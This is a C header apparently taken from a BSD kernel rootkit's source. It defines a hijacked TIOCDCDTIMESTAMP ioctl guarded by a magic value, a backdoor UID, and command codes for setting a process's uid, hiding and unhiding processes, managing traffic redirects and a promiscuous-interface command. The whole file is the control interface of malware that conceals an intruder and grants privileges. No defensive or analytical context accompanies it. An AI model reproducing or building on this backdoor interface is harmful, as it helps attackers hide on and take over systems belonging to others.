#ifndef CONFIG_H
#define CONFIG_H
#include <sys/time.h>
#include <sys/ttycom.h>

#define EVIL_IOCTL_COMMAND TIOCDCDTIMESTAMP
#define EVIL_IOCTL_MAGIC "\x04\x72\x63\x46"

#define EVIL_UID 12345

typedef struct {
	unsigned int	command;
	unsigned int	res;
	unsigned int	args[6];
} o2_args;

#define PING_COMMAND 0x1
#define PID_COMMAND 0x2
  #define PID_UID 0x1
  #define PID_HIDE 0x2
  #define PID_UNHIDE 0x3
#define REDIR_COMMAND 0x3
  #define REDIR_ADD 0x1
  #define REDIR_RM 0x2
  #define REDIR_LIST 0x3
#define IFPROMISC_COMMAND 0x4

#endif /* CONFIG_H */
